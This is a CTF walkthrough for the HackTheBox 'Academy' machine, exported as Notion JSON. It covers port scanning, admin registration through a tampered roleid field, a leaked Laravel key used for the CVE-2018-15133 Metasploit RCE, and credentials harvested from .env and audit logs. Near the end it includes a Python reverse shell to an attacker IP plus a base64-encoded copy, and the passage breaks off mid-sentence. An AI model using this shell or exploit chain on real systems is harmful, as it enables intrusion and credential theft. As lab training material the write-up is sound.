{"children":[{"children":[],"uri":"https://www.notion.so/26988544a3854b69afee43b81007b4c4","type":"heading","createdTime":1614688496542,"lastEditedTime":1614688440000,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/535cfc2f736a43eabd6c1f3dce79bfd8","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["$ nmap -p- 10.10.10.215 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/b31ba9610e0f4484827f9074c86a6c52","type":"code","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["PORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n33060/tcp open  mysqlx"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/5947c0a8c2ee402d998bae8d611a2bd4","type":"bulleted_list","createdTime":1614688496542,"lastEditedTime":1614688440000,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/24b0eec7eca14cde992a014a0df5230a","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["$ nmap -sC -sV -p 22,80,33060 10.10.10.215 > scan.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/a047e0da167d43d6ba5c3eea04773c5d","type":"code","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["PORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)\n|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)\n|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)\n80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://academy.htb/\n33060/tcp open  mysqlx?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:\n|     Invalid message\"\n|_    HY000\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port33060-TCP:V=7.91%I=7%D=12/13%Time=5FD5A260%P=x86_64-unknown-linux-g\nSF:nu%r(NULL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\\nSF:0\\x0b\\x08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(\nSF:HTTPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\nSF:\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(D\nSF:NSVersionBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusReques\nSF:tTCP,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1\nSF:a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x\nSF:1a\\0\")%r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x\nSF:08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServer\nSF:Cookie,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\nSF:\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20mes\nSF:sage\\\"\\x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBPro\nSF:gNeg,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x0\nSF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\\nSF:x05HY000\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDS\nSF:tring,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\\nSF:x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20mess\nSF:age\\\"\\x05HY000\")%r(LDAPBindReq,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SIPO\nSF:ptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\nSF:\\x08\\x05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(N\nSF:CP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\\nSF:x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x0\nSF:5HY000\")%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x\nSF:05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\nSF:\\0\")%r(ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\\nSF:x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20mess\nSF:age\\\"\\x05HY000\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/801b471ddf064125907393c6f5827572","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, Apache httpd 2.4.41, "]]}],"uri":"https://www.notion.so/ec0d14f3d5594bad856cb14c4bfb8565","type":"bulleted_list","createdTime":1614688496542,"lastEditedTime":1614688440000,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/822feafec5554b7b8828854de7342585","type":"heading","createdTime":1614688496542,"lastEditedTime":1614688440000,"title":[["Enumeration"]],"depth":2},{"children":[],"uri":"https://www.notion.so/08343259e75144949d22f8ddf12f7401","type":"text","createdTime":1614688496542,"lastEditedTime":1614688440000,"title":[["HTTP Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/0bf2c27a754f43f096b5bfa752bea482","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["In our targeted Nmap scan, port 80 reveals the virtual hostname as "],["http://academy.htb",[["a","http://academy.htb"]]],[", so let's add "],["10.10.10.215 academy.htb",[["c",null]]],[" to "],["/etc/hosts",[["c",null]]],["."]]},{"children":[],"uri":"https://www.notion.so/30b15cff2cb24fee8e4f2d1bf3fb956c","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Website is an \"academy\" platform for HackTheBox, and seems to be a mirror of the real website at "],["https://academy.hackthebox.eu/",[["a","https://academy.hackthebox.eu/"]]],["."]]},{"children":[{"children":[],"uri":"https://www.notion.so/6d4bd3bdb26e4bb69d336aaf500515bd","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["/academy/public/admin.php",[["c",null]]]]}],"uri":"https://www.notion.so/a539de06a3364ab6ba4201626322f7ac","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Brute force directories with OWASP DirBuster and found an admin panel:"]]},{"children":[],"uri":"https://www.notion.so/5f173cec7937401fa408628de39bc831","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["The admin panel contains a register function, let's send a request and intercept it with Burp Suite, then forward the request to the repeater to have a deeper look."]]},{"children":[{"children":[],"uri":"https://www.notion.so/7baa9d57d2d644ac858b7f2021024b18","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["uid=samiko&password=samiko&confirm=samiko&roleid=1",[["c",null]]]]}],"uri":"https://www.notion.so/6222987b3b2646d1970edee4e45e77ff","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Register POST request has a "],["roleid",[["c",null]]],[" field, which we can change to a "],["1",[["c",null]]],[" to register as an admin:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/db7a21ef5c6a45f2b0187fce2802a3cf","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["samiko:samiko",[["c",null]]]]}],"uri":"https://www.notion.so/74f0e7fc2cdd4acea7a6db4fd4e64df2","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Login using the newly created admin account:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/926fcdd525f54c2db036ef41c6863572","type":"numbered_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Pending job: \"Fix issue with dev-staging-01.academy.htb\""]]},{"children":[],"uri":"https://www.notion.so/739dea566e0f41289bc2dc8398b9decf","type":"numbered_list","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["Done job: \"Complete initial set of modules (cry0l1t3 / mrb3n)\""]]}],"uri":"https://www.notion.so/13262b4a18a842738c7a1ee4df2ea055","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Upon entering the admin panel, we see a list of pending or completed jobs regarding the deployment of the academy website:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1088727115114fa78e6af52ebb62099b","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["cry0l1t3, mrb3n"]]}],"uri":"https://www.notion.so/c8393e91b1484f0d921b7da4f3547ebe","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Found possible usernames:"]]},{"children":[],"uri":"https://www.notion.so/c24b08d5a5ec4e4785683b7828adb554","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Navigating to the staging server and we start to get redirect errors again. Append "],["dev-staging-01.academy.htb",[["c",null]]],[" to "],["/etc/hosts",[["c",null]]],[" under the same IP entry."]]},{"children":[{"children":[],"uri":"https://www.notion.so/e4e5e2964bd0445885d58a198dea5754","type":"code","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["DB_HOST       \"127.0.0.1\"\nDB_PORT\t      \"3306\"\nDB_DATABASE\t  \"homestead\"\nDB_USERNAME\t  \"homestead\"\nDB_PASSWORD\t  \"secret\""]],"language":"JavaScript","wrap":false}],"uri":"https://www.notion.so/51e62478234f45d0a4e3999be96b16c6","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Environmental variables are exposed on the staging server, found possibly hidden database credentials:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/02a58c44819e4ecab067400c21f6ab76","type":"code","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["APP_NAME\t    \"Laravel\"\nAPP_ENV\t      \"local\"\nAPP_KEY\t      \"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=\""]],"language":"JavaScript","wrap":false}],"uri":"https://www.notion.so/0c6d63b8586248f4b8000788a75ae773","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Found application name and key:"]]},{"children":[],"uri":"https://www.notion.so/bb28e63990604541abe6639edd89339a","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["We discover that the host is running on Laravel PHP framework, and the application key seems to be exposed for some reason."]]},{"children":[],"uri":"https://www.notion.so/97db6097b46c4d4db48ecca29a96f1f0","type":"heading","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Exploitation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/4c2e91f3615c4b6a948ed92cae0b8c76","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Laravel 5.5.40/5.6.x-5.6.29 is vulnerable to an RCE attack under CVE-2018-15133, which is caused by an insecure deserialisation call on an untrusted "],["X-XSRF-TOKEN",[["c",null]]],[" value."]]},{"children":[],"uri":"https://www.notion.so/6cdb406a77e54b86a00d722430129481","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["This exploit is possible if the "],["APP_KEY",[["c",null]]],[" is known or exposed from a "],[".env",[["c",null]]],[" file disclosure, which we have discovered earlier on the staging server."]]},{"children":[{"children":[],"uri":"https://www.notion.so/ae9ec8ede0f24d0083b788ce6c48433e","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["$ msfconsole",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/63e0ec3469244ec7988b55be654628a1","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["> search laravel",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/18fbc051702745f28d8c087a7d9a5663","type":"code","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/51b238540d33422fb70983faedf72aff","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["> use 0",[["c",null]]]]}],"uri":"https://www.notion.so/36110e7b157c41679a3fdda17b386f81","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Using Metasploit, let's look for an existing exploit:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/b2ceb5ce1db94af3816f91d353ff3331","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["> set RHOST 10.10.10.215",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/29692142f0f64d0b93b10138ef3e723a","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["> set VHOST dev-staging-01.academy.htb",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/0fa07533fe574b9b889e3dadb5e5e058","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["> set LHOST 10.10.14.53",[["c",null]]]]}],"uri":"https://www.notion.so/19d2e9e93187408cb6fd3c9e284afc94","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Using options:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/afc5992afb9a4c2186dbc419b461bd2f","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["> run",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/314d3d56ee8647a4b69a09bf2beac22b","type":"text","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["$ ls -la /home/",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/989f3b0272a94ce9bcd374f6fa6d2641","type":"code","createdTime":1614688496544,"lastEditedTime":1614688440000,"title":[["drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10 00:34 21y4d\ndrwxr-xr-x  2 ch4p     ch4p     4096 Aug 10 00:34 ch4p\ndrwxr-xr-x  6 cry0l1t3 cry0l1t3 4096 Dec 13 22:55 cry0l1t3\ndrwxr-xr-x  3 egre55   egre55   4096 Aug 10 23:41 egre55\ndrwxr-xr-x  2 g0blin   g0blin   4096 Aug 10 00:34 g0blin\ndrwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12 22:19 mrb3n"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/aec6afea1320490f93f0d856c894f705","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["After running the exploit, we should get a shell as www-data:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/30718deef4e24ee9a97bc141d3d2a246","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ echo \"21y4d ch4p cry0l1t3 egre55 g0blin mrb3n\" | tr -s ' ' '\\n' > usernames.txt",[["c",null]]]]}],"uri":"https://www.notion.so/4809ca041eb84e708977f476e09f5202","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Get usernames and save them to a file:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/54aa9df0467140ad94d757d95f3a1c08","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["-rwxrwxr-x 1 cry0l1t3 cry0l1t3 297851 Nov 24 18:44 linpeas.sh\n-r--r----- 1 cry0l1t3 cry0l1t3     33 Dec 13 21:38 user.txt"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/91f3ac05fd4b48a9a41f0b80a41d0e56","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Out of all other users, cry0l1t3 has the latest modification date. We find a "],["linpeas.sh",[["c",null]]],[" script (which was not placed by other users) and the user flag:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/08a7e11f384d4ac2b5c38a581df077e1","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ cat /var/www/html/academy/.env",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/7466f0fb38fd4674bd7ccf75b46f2c30","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["DB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=academy\nDB_USERNAME=dev\nDB_PASSWORD=mySup3rP4s5w0rd!!"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/c43f7a08f0a74829b1ab4160ab58a3bf","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["We find the "],[".env",[["c",null]]],[" file exposed on "],["dev-staging-01.academy.htb",[["c",null]]],[" earlier, and this time the database password is not censored:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/f71affe1296a4c74862ecd5233c03d9f","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ crackmapexec ssh 10.10.10.215 -u ./usernames.txt -p 'mySup3rP4s5w0rd!!'",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/e729ca997d4d45e5abfea5db5ac92eb2","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["SSH         10.10.10.215    22     10.10.10.215     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1\nSSH         10.10.10.215    22     10.10.10.215     [-] 21y4d:mySup3rP4s5w0rd!! Authentication failed.\nSSH         10.10.10.215    22     10.10.10.215     [-] ch4p:mySup3rP4s5w0rd!! Authentication failed.\nSSH         10.10.10.215    22     10.10.10.215     [+] cry0l1t3:mySup3rP4s5w0rd!!"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/f9cd2a3da541491c90a37a00bb61a1f1","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Found password "],["mySup3rP4s5w0rd!!",[["c",null]]],[", checking if a user reused it for their SSH credentials:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2bef1a09ac2a45cc95325d01234564dc","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["cry0l1t3:mySup3rP4s5w0rd!!",[["c",null]]]]}],"uri":"https://www.notion.so/c862dbae58904ff698cacff201925136","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Found SSH credentials:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/65d2148032e24e17a45fc41bb7faa938","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ ssh cry0l1t3@10.10.10.215",[["c",null]]]]}],"uri":"https://www.notion.so/20905aa7f7354bafa5963d22f8061428","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["SSH in as cry0l1t3:"]]},{"children":[],"uri":"https://www.notion.so/fcfac3b647dc45f695a70daba12a6a5f","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Get user flag!"]]},{"children":[],"uri":"https://www.notion.so/f28c1c0e608e4f238e824a20e29d125a","type":"heading","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Privilege Escalation"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/9b34235dbf9e42c0837b44b3847239d3","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ sudo -l",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/616896dcde1a44a1945b831d5658ef72","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["Cannot run sudo."]]}],"uri":"https://www.notion.so/02c22db3bfff4e49b5b6b481c0fc1cd1","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Checking sudo permissions:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/6c9fdde2e5454f0993392b0efea193ec","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/984683a37f924223a3864f99a484abc1","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/02f60fd0542247cfab2d18ca286d5aa5","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Checking group permissions:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/a52f047baef64d09956e50d4faf99f42","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ cd /var/log/audit && cat * | grep data= | rev | cut -d= -f1 | rev",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/a58af34bfb6d49b0b9ed8bcb59940d86","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["7375206D7262336E0A\n6D7262336E5F41634064336D79210A\n77686F616D690A\n657869740A\n2F62696E2F62617368202D690A\n1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D\n1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D\n3618790D\n63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D\n657869740A\n2F62696E2F62617368202D690A\n6973746F72790D686973746F72790D657869740D\n657869740A"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/653091cab1804976bd0adae7a676a929","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Since cry0l1t3 is in "],["4(adm)",[["c",null]]],[" admin group, this means we should be able to read syslog. While reading the log files, we discover some hexadecimal data in "],["/var/log/audit",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/a2ce23b0725f45e8a61a6acc8701ec6b","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ cd /var/log/audit && cat * | grep data= | rev | cut -d= -f1 | rev | xxd -p -r",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/93c83078c5424f519a02410e76bf65d2","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["exithistory\nsu mrb3n\nmrb3n_Ac@d3my!\nwhoami\nexit\n/bin/bash -i"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/18d665f858144e7e997c93adbaa3c69a","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["We can convert the hexadecimal data to ASCII with "],["xxd",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/0ab9325bcbd34b079a7754a96c219298","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["mrb3n:mrb3n_Ac@d3my",[["c",null]]],[" "]]}],"uri":"https://www.notion.so/56d929b8cd0a42d2aca881184df84842","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Found credentials in the audit log file:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7308d80f758c4acc8efb6987ae993aa5","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ ssh mrb3n@10.10.10.215",[["c",null]]]]}],"uri":"https://www.notion.so/4bbb45b6393048dcbfc1090feb1c3564","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["SSH in as mrb3n:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/84f1e3d4b34f48d2bb37694ac6cedb17","type":"text","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["$ sudo -l",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/807b16af28ab48cbacd55752e67af0fc","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["Matching Defaults entries for mrb3n on academy:\n\tenv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser mrb3n may run the following commands on academy:\n\t(ALL) /usr/bin/composer"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/ce94c0d039264aeb83bd8752e787a8ff","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Checking sudo permissions:"]]},{"children":[],"uri":"https://www.notion.so/abe7d1dd3db24acd840842deb64ef139","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["mrb3n can run dependency manager "],["/usr/bin/composer",[["c",null]]],[" as root, which is a possible vector for privilege escalation if we can get Composer to execute arbitrary scripts."]]},{"children":[{"children":[],"uri":"https://www.notion.so/43b761fa19394e1aa5fd70cb5ea2586a","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["import socket, subprocess;\n\ns = socket.socket();\ns.connect(('10.10.14.53',6969))\n\nwhile 1:\n\tproc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);\n\ts.send(proc.stdout.read()+proc.stderr.read())"]],"language":"Python","wrap":false}],"uri":"https://www.notion.so/d0d7723c30264df4acdbab769a766d69","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Using the following Python reverse shell:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/bf434769aca1412b95a1d5b997f76f41","type":"code","createdTime":1614688496545,"lastEditedTime":1614688440000,"title":[["aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0LjUzJyw2OTY5KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk="]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/a5f04fdcc7194ec5861ee796fdde082c","type":"bulleted_list","createdTime":1614688496543,"lastEditedTime":1614688440000,"title":[["Encode the payload to 